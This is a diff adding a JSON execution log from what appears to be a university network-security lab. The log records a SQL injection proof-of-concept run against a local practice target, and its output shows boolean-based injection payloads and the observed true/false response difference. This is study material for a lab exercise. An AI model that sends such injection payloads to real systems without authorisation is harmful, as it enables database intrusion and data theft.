@@ -1,0 +1,24 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\SQLI-001__1.py",
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-1/?id=1"
+  ],
+  "started_at": "2026-10-20T14:42:04+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.248,
+  "stdout": "[*] GET /Less-1/?id=1 (param id = '1')\r\n    status=200 len=721 sha256=14fec1f7152894b9 marker=True\r\n[*] GET /Less-1/?id=1 (param id = \"1' AND '1'='1\")\r\n    status=200 len=721 sha256=14fec1f7152894b9 marker=True\r\n[*] GET /Less-1/?id=1 (param id = \"1' AND '1'='2\")\r\n    status=200 len=670 sha256=cf6c54521d5a6912 marker=False\r\n\r\n[=] true-branch  marker=True (expected True: query still selects the row)\r\n[=] false-branch marker=False (expected False if the quote escaped the string)\r\n[+] differential observed: the parameter changes a WHERE truth value\r\n[!] one local observation is not full proof; keep the raw requests and responses\r\n",
+  "stderr": "",
+  "cohort": "v2",
+  "stem": "SQLI-001__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v2\\SQLI-001__1.py",
+  "args_redacted": [
+    "--base-url",
+    "http://127.0.0.1:9081",
+    "--path",
+    "/Less-1/?id=1"
+  ]
+}
